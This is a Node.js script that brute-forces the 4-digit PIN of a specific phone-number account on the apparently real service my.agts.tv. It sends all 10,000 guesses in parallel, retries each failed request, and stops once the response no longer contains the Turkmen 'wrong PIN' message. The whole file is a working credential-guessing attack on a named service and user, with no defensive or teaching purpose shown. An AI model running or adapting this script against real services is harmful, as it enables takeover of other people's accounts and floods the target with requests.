const axios = require('axios');

const phone = "756363";
let errorCount = 0;
const startTime = new Date();

function codeToString(code) {
    return "0".repeat(4 - code.toString().length) + code;
}

const test = (pin) => { 
    axios.get(`https://my.agts.tv/?phone=${phone}&pin=${pin}`)
    .then((({data}) => {
        if (data.indexOf("PIN belgiňiz nädogry") === -1) {
            console.log("PIN: ", pin);
            console.log("ErrorCount: ", errorCount);
            console.log("Time used: ", (new Date().getTime() - startTime.getTime()) / 1000, "secunds");
            process.exit();
        }
        console.log(pin);
    })).catch((err) => { errorCount++; test(pin) });
}

for (let i = 0; i < 10000; i++) {
    const pin = codeToString(i);
    test(pin);
}

